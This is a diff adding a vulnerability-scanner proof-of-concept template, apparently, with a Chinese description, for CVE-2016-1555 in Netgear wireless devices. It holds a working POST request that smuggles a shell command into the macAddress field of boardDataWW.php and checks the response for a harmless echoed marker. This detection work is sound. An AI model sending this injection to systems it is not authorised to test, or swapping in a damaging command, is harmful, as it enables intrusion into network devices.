@@ -1,0 +1,33 @@
+[info]
+author = "AVE"
+description = "通过向 boardDataWW.php 发送包含命令注入的 POST 请求，验证目标是否存在未授权远程命令执行漏洞。若响应中包含注入命令的输出，则判定存在漏洞。"
+id = "POC-AVE-2016-0109"
+name = "Netgear 多款无线设备 boardData.php 未授权远程命令执行漏洞 PoC"
+severity = "critical"
+tags = ["ave-2016-0109"]
+vuln_id = [
+    "CVE-2016-1555",
+    "AVE-2016-0109",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/boardDataWW.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "macAddress=00:11:22:33:44:55;echo%20AVE_TEST;;reginfo=1&writeData=Submit"
+type = "raw"
+
+[poc.requests.headers]
+Connection = "Keep-Alive"
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVE_TEST"]
